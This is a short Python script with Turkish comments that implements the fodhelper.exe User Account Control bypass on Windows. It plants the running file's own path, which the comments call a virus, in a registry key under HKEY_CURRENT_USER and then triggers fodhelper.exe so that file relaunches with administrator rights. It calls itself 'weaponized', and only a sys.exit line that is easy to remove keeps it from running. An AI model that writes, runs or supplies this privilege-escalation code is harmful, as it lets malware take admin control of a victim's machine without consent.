import os
import sys
import winreg

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod Kullanıcı Hesabı Denetimi'ni (UAC) atlatır.")

print("--- WEAPONIZED FODHELPER BYPASS ---")

def bypass_uac():
    # 1. HEDEF KOMUT (Weaponized Part)
    # Simülasyon: command = "cmd.exe"
    # Gerçek: Virüsün kendi yolu (High Integrity olarak tekrar çalışacak)
    
    # Mevcut virüs dosyasının yolu
    virus_path = os.path.abspath(sys.argv[0]) 
    command = f"cmd /c start {virus_path}" 
    
    print(f"[*] Kayıt Defteri manipüle ediliyor: {command}")
    
    # 2. REGISTRY MANİPÜLASYONU
    # 'fodhelper.exe' Windows'un güvenilir bir parçasıdır ve UAC sormaz.
    # Ancak Registry'deki belirli bir anahtara bakar. O anahtarı değiştiriyoruz.
    
    path = r"Software\Classes\ms-settings\Shell\Open\command"
    
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, path)
        
        # 'DelegateExecute' boş olmalı
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        # Varsayılan değere virüsümüzü yazıyoruz
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
        
        winreg.CloseKey(key)
        
        print("[!] Tetikleniyor...")
        # fodhelper.exe çalışınca, bizim virüsümüzü Admin olarak açar.
        os.system("fodhelper.exe")
        
        print("💀 BAŞARILI: Yeni açılan pencere ADMIN yetkisindedir.")
        
    except Exception as e:
        print(f"[-] Hata: {e}")

if __name__ == "__main__":
    bypass_uac()